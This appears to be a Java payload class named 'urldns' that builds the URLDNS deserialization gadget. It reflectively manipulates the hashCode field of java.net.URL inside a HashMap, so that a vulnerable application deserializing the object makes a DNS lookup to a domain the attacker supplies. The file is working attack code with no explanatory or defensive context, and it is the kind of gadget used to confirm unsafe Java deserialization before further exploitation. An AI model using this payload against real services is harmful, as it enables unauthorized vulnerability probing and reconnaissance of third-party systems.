package payload;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.net.URL;

public class urldns {
    public Object dnslog(String dns) throws Exception {
        HashMap map = new HashMap();
        URL url = new URL(dns);
        Field field = Class.forName("java.net.URL").getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,123);
        map.put(url,123);
        field.set(url,-1);
        return map;
    }
}